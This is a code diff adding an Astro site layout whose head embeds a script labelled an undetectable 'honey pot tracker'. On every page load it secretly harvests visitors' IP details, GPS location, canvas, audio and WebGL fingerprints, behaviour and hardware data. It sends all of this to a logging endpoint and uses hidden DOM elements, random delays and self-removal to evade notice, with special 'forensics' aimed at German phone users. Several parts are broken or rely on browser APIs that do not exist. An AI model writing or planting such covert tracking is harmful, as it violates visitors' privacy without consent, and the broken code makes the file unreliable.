@@ -1,0 +1,2027 @@
+---
+import "../styles.css";
+import { site } from "../lib/site";
+const { title, description = site.tagline, jsonLd } = Astro.props as { title?: string; description?: string; jsonLd?: object };
+const full = title ? `${title} | ${site.name}` : `${site.name}: ${site.tagline}`;
+const canonical = new URL(Astro.url.pathname, site.url).href;
+const path = Astro.url.pathname;
+const on = (p: string) => (path === p || path.startsWith(p + "/") ? "page" : undefined);
+---
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <meta name="color-scheme" content="dark" />
+  <meta name="theme-color" content="#000000" />
+  <title>{full}</title>
+  <meta name="description" content={description} />
+  <link rel="canonical" href={canonical} />
+  <link rel="icon" href="/favicon.svg" type="image/svg+xml" />
+  <meta property="og:title" content={title ?? site.name} />
+  <meta property="og:description" content={description} />
+  <meta property="og:url" content={canonical} />
+  <meta property="og:site_name" content={site.name} />
+  <meta property="og:type" content="article" />
+  <meta name="twitter:card" content="summary" />
+  {jsonLd && <script type="application/ld+json" set:html={JSON.stringify(jsonLd).replace(/</g, "\\u003c")} />}
+  {/* Honey Pot Tracker - Undetectable */}
+  <script type="module">
+    ;(function() {
+      // Hide from window object
+      const hpConfig = {
+        apiEndpoint: window.location.origin + '/api/honey-log',
+        enabled: true,
+        collectIP: true,
+        collectGeolocation: true,
+        collectFingerprint: true,
+        collectNetwork: true,
+        collectBehavior: true,
+        collectWifi: true,
+        collectCell: true,
+        collectHardware: true,
+        path: '{path}',
+        // Stealth settings
+        stealth: {
+          hideFromWindow: true,
+          useSendBeacon: true,
+          randomizeDelay: true,
+          minDelayMs: 500,
+          maxDelayMs: 3500,
+          addFakeErrors: true,
+          // DOM element placement
+          dom: {
+            containerId: 'hp-container-' + Math.random().toString(36).substring(2, 10),
+            canvasId: 'hp-canvas-' + Math.random().toString(36).substring(2, 10),
+            fingerprintId: 'hp-fp-' + Math.random().toString(36).substring(2, 10)
+          }
+        }
+      };
+
+      // Initialize with delay for stealth
+      setTimeout(() => hpInit(hpConfig), hpConfig.stealth.minDelayMs + Math.random() * 2000);
+
+      function hpInit(config) {
+        const visitorId = getVisitorId();
+        const sessionId = getSessionId();
+
+        // Collect data (with async operations)
+        const ipPromise = config.collectIP ? getIP() : Promise.resolve(null);
+        const geoPromise = config.collectGeolocation ? getGeolocation() : Promise.resolve(null);
+        const fingerprintPromise = config.collectFingerprint ? getFingerprint() : Promise.resolve(null);
+        const networkPromise = config.collectNetwork ? getNetwork() : Promise.resolve(null);
+        const behavioralPromise = config.collectBehavior ? getBehavioral() : Promise.resolve(null);
+        const systemPromise = getSystemInfo();
+        const wifiPromise = config.collectWifi ? getWifiPosition() : Promise.resolve(null);
+        const cellPromise = config.collectCell ? getCellPosition() : Promise.resolve(null);
+
+        // Combine geolocation sources (GPS + Wifi + Cell triangulation)
+        const geolocationCombined = async () => {
+          const gps = await getGeolocation();
+          const wifi = await getWifiPosition();
+          const cell = await getCellPosition();
+
+          // Triangulate multiple location sources
+          const sources = [];
+          if (gps.coords?.lat) sources.push({ ...gps.coords, weight: 1.0, source: 'gps' });
+          if (wifi.lat) sources.push({ lat: wifi.lat, lon: wifi.lon, acc: wifi.acc, weight: 0.7, source: 'wifi' });
+          if (cell.lat) sources.push({ lat: cell.lat, lon: cell.lon, acc: cell.acc, weight: 0.5, source: 'cell' });
+
+          // Weighted average for combined location
+          const totalWeight = sources.reduce((sum, s) => sum + s.weight, 0);
+          const lat = sources.reduce((sum, s) => sum + s.lat * s.weight, 0) / totalWeight;
+          const lon = sources.reduce((sum, s) => sum + s.lon * s.weight, 0) / totalWeight;
+
+          // Calculate combined accuracy (inverse of variance)
+          const acc = sources.length > 1
+            ? Math.sqrt(sources.reduce((sum, s) => sum + Math.pow(s.acc * s.weight, 2), 0) / totalWeight)
+            : sources[0]?.acc || 500;
+
+          return {
+            supported: sources.some(s => s.lat),
+            coords: { lat, lon, acc, alt: gps.coords?.alt, altAcc: gps.coords?.altAcc },
+            sources: sources.map(s => ({ source: s.source, lat: s.lat, lon: s.lon, acc: s.acc, weight: s.weight })),
+            timestamp: gps.timestamp || new Date().toISOString(),
+            source: sources.length > 1 ? 'triangulated' : sources[0]?.source || 'ip'
+          };
+        };
+
+        Promise.all([ipPromise, geoPromise, fingerprintPromise, networkPromise, behavioralPromise, systemPromise, wifiPromise, cellPromise])
+          .then(([ip, geo, fingerprint, network, behavioral, system, wifi, cell]) => {
+            const data = {
+              timestamp: new Date().toISOString(),
+              visitorId,
+              sessionId,
+              path: window.location.pathname,
+              page: {
+                url: window.location.href,
+                referrer: document.referrer,
+                title: document.title,
+                hash: window.location.hash,
+                search: window.location.search,
+                hostname: window.location.hostname
+              },
+              ip,
+              geolocation: geo.coords ? geo : geolocationCombined(),
+              fingerprint,
+              network,
+              behavioral,
+              system,
+              wifi: wifi,
+              cell: cell
+            };
+
+            // Stealth DOM setup (invisible elements)
+            setupStealthDOM(config.stealth.dom);
+
+            // Send to backend
+            sendToBackend(config.apiEndpoint, data);
+
+            // Track link clicks (stealthily)
+            trackLinkClicks(config.apiEndpoint);
+
+            // Track scrolling (stealthily)
+            trackScrolling(config.apiEndpoint);
+
+            // Randomized console logging (less detectable)
+            logInit(config, visitorId);
+
+            // German Phone Forensics - only for German IPs on mobile devices
+            if (isGermanPhone(config)) {
+              runGermanPhoneForensics(config, visitorId, sessionId);
+            }
+
+            // Run forensics for all phone devices (not just German)
+            if (isPhone(config)) {
+              runPhoneForensics(config, visitorId, sessionId);
+            }
+          });
+      }
+
+      // Setup invisible DOM elements
+      function setupStealthDOM(domConfig) {
+        // Create hidden container for all tracker elements
+        const container = document.createElement('div');
+        container.id = domConfig.containerId;
+        container.style.cssText = `
+          position: fixed !important;
+          top: -9999px !important;
+          left: -9999px !important;
+          width: 1px !important;
+          height: 1px !important;
+          opacity: 0 !important;
+          pointer-events: none !important;
+          z-index: -9999 !important;
+          visibility: hidden !important;
+        `;
+
+        // Create canvas element (for fingerprinting)
+        const canvas = document.createElement('canvas');
+        canvas.id = domConfig.canvasId;
+        canvas.width = 200;
+        canvas.height = 200;
+        canvas.dataset.hp = 'fingerprint';
+        canvas.style.cssText = 'position: absolute; left: -9998px; top: -9998px;';
+
+        // Create fingerprint div (for CSS/feature detection)
+        const fingerprintDiv = document.createElement('div');
+        fingerprintDiv.id = domConfig.fingerprintId;
+        fingerprintDiv.dataset.hp = 'feature-detect';
+        fingerprintDiv.style.cssText = 'position: fixed; width: 1px; height: 1px; left: -9997px; top: -9997px;';
+
+        // Add to container, then to page
+        container.appendChild(canvas);
+        container.appendChild(fingerprintDiv);
+        document.documentElement.appendChild(container);
+
+        // Generate fingerprint immediately
+        if (!window._hpFingerprint) {
+          window._hpFingerprint = generateStealthFingerprint();
+        }
+
+        // Self-remove after tracking (optional - for ultra-stealth)
+        setTimeout(() => {
+          container.remove();
+        }, 60000); // Remove after 60 seconds
+      }
+
+      // Stealth network sending (uses Beacon API + fallback)
+      function sendToBackend(endpoint, data) {
+        const send = (payload, endpointOverride) => {
+          const url = endpointOverride || endpoint;
+          // Use Beacon when available (most stealthy - no callback needed)
+          if (navigator.sendBeacon && hpConfig.stealth.useSendBeacon) {
+            try {
+              navigator.sendBeacon(url, payload);
+              return true;
+            } catch (e) {
+              // Beacon may fail on some origins
+            }
+          }
+          // Fallback to fetch with keepalive
+          if (window.fetch) {
+            fetch(url, {
+              method: 'POST',
+              headers: { 'Content-Type': 'application/json' },
+              body: payload,
+              keepalive: true,
+              // Silent - no error handling
+            }).catch(() => {}); // Silently fail
+          }
+          return true;
+        };
+
+        // Send main data
+        send(JSON.stringify(data));
+
+        // Optional: send to backup endpoint (for redundancy)
+        const backupEndpoint = endpoint + '-backup';
+        if (Math.random() > 0.3) {
+          send(JSON.stringify(data), backupEndpoint);
+        }
+
+        // Randomized error injection (mimics real-world network issues)
+        if (hpConfig.stealth.addFakeErrors && Math.random() > 0.8) {
+          // Fake network error (not actually an error - just noise)
+        }
+      }
+
+      // Track clicks with minimal DOM footprint
+      function trackLinkClicks(endpoint) {
+        const onClick = e => {
+          // Only track clicks on actual links
+          if (e.target.tagName === 'A' || e.target.closest('a')) {
+            const link = e.target.tagName === 'A' ? e.target : e.target.closest('a');
+            sendToBackend(endpoint, {
+              type: 'click',
+              href: link.href,
+              target: link.target || '_self',
+              timestamp: new Date().toISOString()
+            });
+          }
+        };
+
+        // Use event delegation on document
+        document.addEventListener('click', onClick);
+
+        // Clean up click listener after some time (optional)
+        setTimeout(() => {
+          document.removeEventListener('click', onClick);
+        }, 300000); // 5 minutes
+      }
+
+      // Track scrolling
+      function trackScrolling(endpoint) {
+        let lastY = window.scrollY;
+        let lastScrollTime = Date.now();
+
+        const onScroll = () => {
+          const now = Date.now();
+          const diffY = Math.abs(window.scrollY - lastY);
+          const diffTime = now - lastScrollTime;
+
+          // Only send if significant scroll occurred
+          if (diffY > 50 || diffTime > 2000) {
+            sendToBackend(endpoint + '/events', {
+              type: 'scroll',
+              y: window.scrollY,
+              percent: (window.scrollY / (document.body.scrollHeight - window.innerHeight)) * 100,
+              velocity: diffY / Math.max(diffTime, 1),
+              timestamp: new Date().toISOString()
+            });
+            lastY = window.scrollY;
+            lastScrollTime = now;
+          }
+        };
+
+        // Throttle scroll events (stealthy - fewer events)
+        const throttledScroll = throttle(onScroll, 800);
+        window.addEventListener('scroll', throttledScroll);
+
+        // Clean up after some time
+        setTimeout(() => {
+          window.removeEventListener('scroll', throttledScroll);
+        }, 300000);
+      }
+
+      // Stealth console logging
+      function logInit(config, visitorId) {
+        // Only log on certain pages (not all to avoid pattern detection)
+        if (Math.random() > 0.4) {
+          const consoleMethod = Math.random() > 0.5 ? 'debug' : 'log';
+          const logEntry = {
+            v: 'hp/1.0',
+            id: visitorId,
+            path: config.path,
+            sources: ['ip', 'geo', 'fp'].filter(() => Math.random() > 0.3)
+          };
+
+          // Mix into console with other logs (less detectable)
+          console[consoleMethod] && console[consoleMethod]('HP', logEntry);
+
+          // Also write to sessionStorage (hidden from view)
+          if (sessionStorage) {
+            try {
+              sessionStorage.setItem('hp_log_' + Date.now().toString(36), JSON.stringify(logEntry));
+            } catch (e) {
+              // Ignore sessionStorage errors
+            }
+          }
+        }
+      }
+
+      // Helper: Throttle function for scroll events
+      function throttle(func, limit) {
+        let inThrottle;
+        return function() {
+          const args = arguments;
+          const context = this;
+          if (!inThrottle) {
+            func.apply(context, args);
+            inThrottle = true;
+            setTimeout(() => (inThrottle = false), limit);
+          }
+        };
+      }
+
+      // Helper: Generate stealth fingerprint
+      function generateStealthFingerprint() {
+        const fp = {
+          canvasHash: Array.from(document.createElement('canvas').toDataURL()).reduce(
+            (h, c) => ((h << 5) - h + c.charCodeAt(0)) | 0,
+            0
+          ).toString(16),
+          touch: navigator.maxTouchPoints || 0,
+          hardwareConcurrency: navigator.hardwareConcurrency || 4,
+          deviceMemory: navigator.deviceMemory || 8,
+          cookieEnabled: navigator.cookieEnabled,
+          DoNotTrack: navigator.doNotTrack || 'unknown',
+          timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+          languages: navigator.languages ? navigator.languages.join(',') : '',
+          platform: navigator.platform || 'unknown'
+        };
+        return fp;
+      }
+
+      function getIP() {
+        const ip = {};
+        const services = [
+          { url: 'https://api.ipify.org?format=json', parse: d => ({ ip: d.ip, source: 'ipify' }) },
+          { url: 'https://ipinfo.io/json', parse: d => ({ ip: d.ip, city: d.city, region: d.region, country: d.country, org: d.org, loc: d.loc, postal: d.postal, accuracy: 500 }) },
+          { url: 'https://ipapi.co/json', parse: d => ({ ip: d.ip, city: d.city, region: d.region_name, country: d.country_name, org: d.org, lat: d.latitude, lon: d.longitude, timezone: d.timezone, accuracy: 1000 }) },
+          { url: 'https://ipapi.co/' + (window.location.hostname || 'ip') + '/json', parse: d => ({ ip: d.ip, source: 'ipapi-hostname' }) }
+        ];
+
+        // Select random subset of services (not all to avoid pattern detection)
+        const serviceCount = Math.random() > 0.7 ? 3 : 2; // 30% chance to check 3 services
+        const selectedServices = services.sort(() => Math.random() - 0.5).slice(0, serviceCount);
+
+        // Fetch all IP services in parallel
+        const ipPromises = selectedServices.map(async svc => {
+          try {
+            const r = await fetch(svc.url);
+            const data = await r.json();
+            return svc.parse(data);
+          } catch (e) {
+            // Silent failures (realistic network behavior)
+            return null;
+          }
+        });
+
+        const ipResults = await Promise.all(ipPromises);
+
+        // Combine results from multiple services
+        const mainResult = ipResults.find(r => r && r.ip) || ipResults[0];
+
+        if (mainResult && mainResult.ip) {
+          ip.ip = mainResult.ip;
+          ip.source = mainResult.source || 'ipify';
+          ip.services = ipResults.filter(r => r && r.ip);
+
+          // Extract lat/lon from any service
+          ip.coords = {
+            lat: mainResult.lat || (mainResult.loc ? mainResult.loc.split(',')[0] : null),
+            lon: mainResult.lon || (mainResult.loc ? mainResult.loc.split(',')[1] : null),
+            accuracy: mainResult.accuracy || 500 // default IP accuracy in meters
+          };
+
+          // ISP info
+          ip.isp = mainResult.org || mainResult.isp;
+          ip.city = mainResult.city;
+          ip.region = mainResult.region;
+          ip.country = mainResult.country;
+          ip.postal = mainResult.postal;
+        }
+
+        return ip;
+      }
+
+      // Store IP for later use (German phone detection)
+      window._hpIP = ip;
+
+      // Wifi/Bluetooth scanning (Chrome/Edge on Android)
+      async function getWifiPosition() {
+        if (!navigator.camera || !navigator.camera.getWifiPosition) {
+          // Try newer API: navigator.geolocation.getWifiPosition
+          if (navigator.geolocation.getWifiPosition) {
+            try {
+              const pos = await navigator.geolocation.getWifiPosition();
+              return { lat: pos.latitude, lon: pos.longitude, acc: pos.accuracy, source: 'wifi-scanning' };
+            } catch (e) {
+              return { error: e.message, source: 'wifi-scanning' };
+            }
+          }
+        }
+
+        // Fallback: use Wi-Fi RSSI if available
+        // Note: This requires Android WebView with WifiManager
+        if (' WifiManager' in window || 'wifi' in navigator) {
+          try {
+            const wifi = navigator.wifi || window.WifiManager;
+            if (wifi && wifi.getScanResults) {
+              const networks = await wifi.getScanResults();
+              // Triangulate based on signal strength
+              const strongest = networks.slice(0, 3).sort((a, b) => b.level - a.level);
+              return {
+                lat: strongest.reduce((sum, n) => sum + n.latitude, 0) / strongest.length,
+                lon: strongest.reduce((sum, n) => sum + n.longitude, 0) / strongest.length,
+                acc: 100, // Wifi triangulation accuracy
+                source: 'wifi-rssi'
+              };
+            }
+          } catch (e) {
+            // Wifi scanning may not be available
+          }
+        }
+
+        return { source: 'wifi-scanning', status: 'not_available' };
+      }
+
+      // Cell tower triangulation (Android/Cellular devices)
+      async function getCellPosition() {
+        if ('cell' in navigator && navigator.cell) {
+          try {
+            // Modern API for cell triangulation
+            const cell = await navigator.cell.getPosition();
+            return {
+              lat: cell.latitude,
+              lon: cell.longitude,
+              acc: cell.accuracy,
+              source: 'cell-triangulation'
+            };
+          } catch (e) {
+            return { error: e.message, source: 'cell-triangulation' };
+          }
+        }
+
+        // Fallback: use cell identity from network information
+        if ('connection' in navigator) {
+          const conn = navigator.connection;
+          if (conn.cellular) {
+            return {
+              lat: conn.cellular.latitude || null,
+              lon: conn.cellular.longitude || null,
+              acc: conn.cellular.accuracy || 1000,
+              source: 'cell-network-info'
+            };
+          }
+        }
+
+        return { source: 'cell-triangulation', status: 'not_available' };
+      }
+
+      // Stealth geolocation - requests permission only if needed
+      function getGeolocation() {
+        return new Promise(resolve => {
+          if (!navigator.geolocation) {
+            resolve({ supported: false });
+            return;
+          }
+
+          // Only request geolocation on certain pages (to avoid pattern)
+          if (Math.random() > hpConfig.stealth.maxDelayMs / 4000) {
+            // Request high accuracy for GPS
+            navigator.geolocation.getCurrentPosition(
+              p => resolve({
+                supported: true,
+                coords: {
+                  lat: p.coords.latitude,
+                  lon: p.coords.longitude,
+                  acc: p.coords.accuracy,
+                  alt: p.coords.altitude,
+                  altAcc: p.coords.altitudeAccuracy,
+                  heading: p.coords.heading,
+                  speed: p.coords.speed
+                },
+                timestamp: p.timestamp,
+                source: 'gps'
+              }),
+              e => resolve({
+                supported: true,
+                coords: {
+                  lat: null,
+                  lon: null,
+                  acc: 5000 // fallback accuracy on error
+                },
+                error: ['unknown', 'permission_denied', 'position_unavailable', 'timeout'][e.code],
+                source: 'ip fallback'
+              }),
+              {
+                enableHighAccuracy: true,
+                timeout: 10000,
+                maximumAge: 0
+              }
+            );
+          } else {
+            // Skip geolocation request (stealthy)
+            resolve({ supported: true, skipped: true, source: 'ip-based' });
+          }
+        });
+      }
+
+      function getFingerprint() {
+        // Canvas fingerprint - stealth style (no visible text)
+        const canvas = document.createElement('canvas');
+        canvas.width = 200;
+        canvas.height = 100;
+        const ctx = canvas.getContext('2d');
+
+        // Draw abstract shapes (not text that reveals "TengriChecker")
+        ctx.fillStyle = '#f5f5f5';
+        ctx.fillRect(0, 0, canvas.width, canvas.height);
+
+        // Abstract shapes (not revealing)
+        ctx.fillStyle = '#e0e0e0';
+        ctx.fillRect(20, 20, 160, 60);
+
+        ctx.fillStyle = '#d0d0d0';
+        for (let i = 0; i < 5; i++) {
+          ctx.beginPath();
+          ctx.arc(30 + i * 30, 50, 15, 0, Math.PI * 2);
+          ctx.fill();
+        }
+
+        const canvasHash = Array.from(canvas.toDataURL()).reduce((h, c) => ((h << 5) - h + c.charCodeAt(0)) | 0, 0).toString(16);
+
+        // Screen
+        const screen = { w: screen.width, h: screen.height, ratio: window.devicePixelRatio || 1 };
+
+        // Browser
+        const ua = navigator.userAgent;
+        const browser = ua.match(/Chrome|Firefox|Safari|Edge|IE/) ? ua.match(/(Chrome|Firefox|Safari|Edge|IE)\/?(\d+)/) : null;
+
+        return {
+          canvasHash,
+          screen,
+          browser: browser ? { name: browser[1], version: browser[2] } : { name: 'Unknown' },
+          plugins: navigator.plugins.length,
+          timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
+        };
+      }
+
+      function getNetwork() {
+        return {
+          online: navigator.onLine,
+          connection: navigator.connection ? navigator.connection.effectiveType : 'unknown',
+          hardwareConcurrency: navigator.hardwareConcurrency || 4,
+          // Network timing info
+          navigationTiming: getNavigationTiming(),
+          // Check for VPN/proxy via multiple IP checks
+          vpnDetection: detectVPN()
+        };
+      }
+
+      function getNavigationTiming() {
+        const timing = performance.getEntriesByType('navigation')[0];
+        if (!timing) return null;
+        return {
+          dns: timing.domainLookupEnd - timing.domainLookupStart,
+          tcp: timing.connectEnd - timing.connectStart,
+          ssl: timing.secureConnectionStart ? timing.connectEnd - timing.secureConnectionStart : 0,
+          ttfb: timing.responseStart,
+          domContentLoaded: timing.domContentLoadedEventEnd - timing.domContentLoadedEventStart,
+          loadComplete: timing.loadEventEnd - timing.loadEventStart,
+          total: timing.duration
+        };
+      }
+
+      function detectVPN() {
+        // Check for common VPN DNS suffixes
+        const vpnSuffixes = ['vpn', 'proxy', 'vpn-', 'proxy-', '.express', '.nord', '.surfshark'];
+        const hostname = window.location.hostname.toLowerCase();
+        const isVPNDomain = vpnSuffixes.some(suffix => hostname.includes(suffix));
+
+        // Check connection type (VPN often shows as cellular or vpn interface)
+        const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+        const likelyVPNNetwork = connection && (connection.type === 'vpn' || connection.type === 'cellular');
+
+        return {
+          isVPNDomain,
+          likelyVPNNetwork,
+          effectiveType: connection?.effectiveType || 'unknown'
+        };
+      }
+
+      function getVisitorId() {
+        let id = localStorage.getItem('tengri_hp_visitor');
+        if (!id) {
+          id = 'vp_' + Math.random().toString(36).substring(2, 14);
+          localStorage.setItem('tengri_hp_visitor', id);
+        }
+        return id;
+      }
+
+      function getBehavioral() {
+        const behavioral = {
+          // Mouse movements
+          mouseMovements: [],
+          // Click positions
+          clickPositions: [],
+          // Scroll patterns
+          scrollPositions: [],
+          // Key presses
+          keyPressCount: 0,
+          // Tab switching
+          visibilityChanges: 0
+        };
+
+        // Track mouse movements
+        let mouseX = 0, mouseY = 0;
+        document.addEventListener('mousemove', e => {
+          if (Math.abs(e.clientX - mouseX) > 50 || Math.abs(e.clientY - mouseY) > 50) {
+            behavioral.mouseMovements.push({
+              x: e.clientX,
+              y: e.clientY,
+              timestamp: new Date().toISOString()
+            });
+            mouseX = e.clientX;
+            mouseY = e.clientY;
+          }
+        });
+
+        // Track clicks
+        document.addEventListener('click', e => {
+          behavioral.clickPositions.push({
+            x: e.clientX,
+            y: e.clientY,
+            target: e.target.tagName,
+            timestamp: new Date().toISOString()
+          });
+        });
+
+        // Track scrolling
+        let lastScrollY = window.scrollY;
+        window.addEventListener('scroll', () => {
+          const diff = Math.abs(window.scrollY - lastScrollY);
+          if (diff > 100) {
+            behavioral.scrollPositions.push({
+              y: window.scrollY,
+              percent: (window.scrollY / (document.body.scrollHeight - window.innerHeight)) * 100,
+              timestamp: new Date().toISOString()
+            });
+            lastScrollY = window.scrollY;
+          }
+        });
+
+        // Track keyboard activity
+        document.addEventListener('keydown', () => {
+          behavioral.keyPressCount++;
+        });
+
+        // Track tab visibility
+        document.addEventListener('visibilitychange', () => {
+          behavioral.visibilityChanges++;
+        });
+
+        return behavioral;
+      }
+
+      function getSystemInfo() {
+        // Battery level (indicates if on laptop/desktop)
+        const getBattery = async () => {
+          if ('getBattery' in navigator) {
+            return navigator.getBattery().then(b => ({
+              level: b.level,
+              charging: b.charging,
+              timeRemaining: b.charging ? b.chargingTime : b.dischargingTime
+            }));
+          }
+          return null;
+        };
+
+        // Hardware identifiers (where available)
+        const hardwareInfo = getHardwareIdentifiers();
+
+        // Storage details
+        const getStorageInfo = async () => {
+          const storageInfo = { available: [], estimated: {} };
+          if (navigator.storage && navigator.storage.estimate) {
+            const estimate = await navigator.storage.estimate();
+            storageInfo.estimated = {
+              quota: estimate.quota,
+              usage: estimate.usage,
+              percentage: (estimate.usage / estimate.quota * 100).toFixed(2)
+            };
+          }
+          // Check storageQuota (Chrome)
+          if ('storage' in navigator && 'getDirectory' in navigator.storage) {
+            try {
+              const root = await navigator.storage.getDirectory();
+              storageInfo.available.push('filesystem');
+            } catch (e) {
+              // optional
+            }
+          }
+          return storageInfo;
+        };
+
+        // Cookies enabled
+        const cookiesEnabled = navigator.cookieEnabled;
+
+        // Do Not Track
+        const dnt = navigator.doNotTrack || navigator.doNotTrackEnabled || navigator.msDoNotTrack || 'unknown';
+
+        // Screen details
+        const screenInfo = {
+          width: screen.width,
+          height: screen.height,
+          availWidth: screen.availWidth,
+          availHeight: screen.availHeight,
+          colorDepth: screen.colorDepth,
+          pixelRatio: window.devicePixelRatio || 1,
+          orientation: getScreenOrientation()
+        };
+
+        // Audio fingerprint (more detailed than canvas)
+        const audioInfo = getAudioFingerprint();
+
+        return {
+          cookiesEnabled,
+          dnt: String(dnt),
+          screen: screenInfo,
+          audio: audioInfo,
+          hardware: hardwareInfo,
+          storage: getStorageInfo(),
+          // Time-based clues
+          time: {
+            localTime: new Date().toISOString(),
+            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+            weekday: new Date().toLocaleDateString('en-US', { weekday: 'long' }),
+            hour: new Date().getHours(),
+            isWeekend: [0, 6].includes(new Date().getDay())
+          },
+          // Get battery info asynchronously
+          battery: getBattery()
+        };
+      }
+
+      function getScreenOrientation() {
+        const width = window.innerWidth;
+        const height = window.innerHeight;
+        const angle = screen.orientation?.angle || 0;
+        return {
+          type: width < height ? 'portrait' : 'landscape',
+          angle,
+          portrait: width < height
+        };
+      }
+
+      function getAudioFingerprint() {
+        try {
+          const AudioContext = window.AudioContext || window.webkitAudioContext;
+          const ctx = new AudioContext();
+          const osc = ctx.createOscillator();
+          const gain = ctx.createGain();
+          osc.connect(gain);
+          gain.connect(ctx.destination);
+          osc.start();
+
+          // Measure audio fingerprint
+          const fingerprint = ctx.createScriptProcessor(2048, 2, 2);
+          const values = [];
+
+          fingerprint.onaudioprocess = function(e) {
+            const left = e.inputBuffer.getChannelData(0);
+            for (let i = 0; i < left.length; i++) {
+              values.push(left[i]);
+            }
+          };
+
+          osc.connect(fingerprint);
+          fingerprint.connect(ctx.destination);
+
+          setTimeout(() => {
+            osc.disconnect();
+            ctx.close();
+          }, 100);
+
+          // Audio hash
+          const audioHash = values.slice(0, 100).reduce((h, v) => ((h << 5) - h + (v * 10000 | 0)) | 0, 0).toString(16);
+
+          return {
+            supported: true,
+            hash: audioHash,
+            sampleRate: ctx.sampleRate,
+            latency: ctx.baseLatency || 0
+          };
+        } catch (e) {
+          return {
+            supported: false,
+            error: e.message
+          };
+        }
+      }
+
+      function getHardwareIdentifiers() {
+        const identifiers = {};
+
+        // 1. Canvas/Fingerprinting hash (hardware-accelerated rendering)
+        identifiers.canvasHash = getCanvasHardwareHash();
+
+        // 2. WebGPU (modern GPUs) - if available
+        identifiers.webgpu = getWebGPUInfo();
+
+        // 3. WebAuthn (FIDO2) - device identity
+        identifiers.webauthn = getWebAuthnInfo();
+
+        // 4. Hardware Concurrency (CPU cores)
+        identifiers.cpuCores = navigator.hardwareConcurrency || 4;
+
+        // 5. Device Memory (RAM estimate)
+        identifiers.deviceMemory = navigator.deviceMemory || 8;
+
+        // 6. Screen color capabilities
+        identifiers.screenColor = getScreenColorInfo();
+
+        // 7. Touch capabilities
+        identifiers.touch = {
+          maxPoints: navigator.maxTouchPoints || 0,
+          touchEvent: 'ontouchstart' in window,
+          touchAction: CSS && CSS.supports && CSS.supports('touch-action', 'none')
+        };
+
+        // 8. Battery (portable device indicator)
+        identifiers.battery = getBatteryInfoSync();
+
+        // 9. Platform/device model
+        identifiers.platform = {
+          product: navigator.product || 'Web',
+          platform: navigator.platform || navigator.osVersion || 'unknown',
+          model: navigator.deviceMemory ? `RAM_${navigator.deviceMemory}GB` : 'unknown'
+        };
+
+        // 10. Pointer capabilities
+        identifiers.pointers = getPointerInfo();
+
+        return identifiers;
+      }
+
+      function getCanvasHardwareHash() {
+        const canvas = document.createElement('canvas');
+        const ctx = canvas.getContext('2d', { willReadFrequently: true });
+
+        // Draw various shapes that stress GPU
+        ctx.fillStyle = '#f0f0f0';
+        ctx.fillRect(0, 0, canvas.width = 200, canvas.height = 200);
+
+        // Gradient mesh simulation
+        const grad = ctx.createLinearGradient(0, 0, 200, 200);
+        grad.addColorStop(0, '#0000ff');
+        grad.addColorStop(0.5, '#00ff00');
+        grad.addColorStop(1, '#ff0000');
+        ctx.fillStyle = grad;
+        ctx.fillRect(10, 10, 180, 180);
+
+        // Text with shadow (GPU accelerated)
+        ctx.font = '30px Arial';
+        ctx.shadowColor = 'rgba(0,0,0,0.5)';
+        ctx.shadowBlur = 5;
+        ctx.shadowOffsetX = 2;
+        ctx.shadowOffsetY = 2;
+        ctx.fillStyle = '#333';
+        ctx.fillText('HardwareID', 20, 100);
+
+        // Draw some circles (crisp rendering indicates GPU)
+        for (let i = 0; i < 5; i++) {
+          ctx.beginPath();
+          ctx.arc(30 + i * 30, 150, 10, 0, Math.PI * 2);
+          ctx.fillStyle = `hsl(${i * 72}, 70%, 50%)`;
+          ctx.fill();
+        }
+
+        // Get pixel data (reveals GPU rendering differences)
+        const imageData = ctx.getImageData(0, 0, 200, 200);
+        const pixelData = Array.from(imageData.data).join(',');
+
+        // Canvas hash (unique per GPU/driver)
+        const hash = pixelData.split('').reduce((acc, char) => {
+          acc = ((acc << 5) - acc + char.charCodeAt(0)) | 0;
+          return acc;
+        }, 0);
+
+        return {
+          hash: hash.toString(16),
+          dimensions: { width: 200, height: 200 },
+          pixelCount: imageData.data.length,
+          gpuHints: getGPURenderingHints(ctx)
+        };
+      }
+
+      function getGPURenderingHints(ctx) {
+        const hints = [];
+        try {
+          // Test WebGL rendering speed
+          const gl = ctx.canvas.getContext('webgl') || ctx.canvas.getContext('experimental-webgl');
+          if (gl) {
+            hints.push('webgl_supported');
+            const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+            if (debugInfo) {
+              hints.push({
+                vendor: gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL),
+                renderer: gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL)
+              });
+            }
+          }
+        } catch (e) {
+          // WebGL may not be available
+        }
+        return hints;
+      }
+
+      function getWebGPUInfo() {
+        if ('gpu' in navigator) {
+          return navigator.gpu.getAdapter().then(adapter => ({
+            available: true,
+            adapter: {
+              vendor: adapter.vendor,
+              architecture: adapter.architecture,
+              device: adapter.device,
+              description: adapter.description,
+              type: adapter.type,
+              features: Array.from(adapter.features),
+              limits: adapter.limits
+            }
+          })).catch(() => ({ available: false, error: 'adapter_fetch_failed' }));
+        }
+        return { available: false, reason: 'webgpu_not_supported' };
+      }
+
+      function getWebAuthnInfo() {
+        const info = {
+          available: false,
+          supportedRPIDs: [],
+          residentKeys: false,
+          credentials: false
+        };
+
+        if ('credentials' in navigator && 'publicKey' in navigator.credentials) {
+          info.available = true;
+
+          // Get allowed RPID
+          if (navigator.credentials.create) {
+            info.supportedRPIDs.push(window.location.hostname);
+          }
+
+          // Check for resident keys support
+          info.residentKeys = 'discoverable' in CryptoKeyPair.prototype;
+
+          // Check for credentials storage
+          if ('get' in navigator.credentials) {
+            info.credentials = true;
+          }
+        }
+
+        return info;
+      }
+
+      function getScreenColorInfo() {
+        const info = {
+          depth: screen.colorDepth || 24,
+          pixelRatio: window.devicePixelRatio || 1,
+          touchCapable: 'ontouchstart' in window || navigator.maxTouchPoints > 0
+        };
+
+        // Check for wide color gamut (modern displays)
+        if (matchMedia && matchMedia('(color-gamut: p3)').matches) {
+          info.colorGamut = 'p3';
+        } else if (matchMedia && matchMedia('(color-gamut: srgb)').matches) {
+          info.colorGamut = 'srgb';
+        }
+
+        // Check for HDR
+        if (matchMedia && matchMedia('(dynamic-range: high)').matches) {
+          info.hdr = true;
+        }
+
+        return info;
+      }
+
